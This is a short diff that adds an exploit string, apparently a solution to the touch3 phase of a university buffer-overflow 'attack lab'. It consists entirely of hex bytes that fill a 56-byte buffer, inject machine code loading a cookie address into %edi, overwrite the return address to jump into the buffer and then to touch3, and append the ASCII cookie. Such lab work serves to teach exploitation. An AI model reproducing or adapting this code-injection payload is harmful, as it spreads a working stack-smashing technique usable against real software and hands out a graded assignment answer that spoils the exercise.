@@ -1,0 +1,12 @@
+48 c7 c7 80 16 67 55 c3 /* mov cookie address, %edi */
+00 00 00 00 00 00 00 00 /* cookie addr:bufaddr+56buffer+8strl */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* end of 56 byte buffer */
+
+38 16 67 55 00 00 00 00 /* buf address */
+4c 18 40 00 00 00 00 00 /* call touch3 address */
+
+31 64 36 66 38 66 61 35 00 /* ascii cookie */
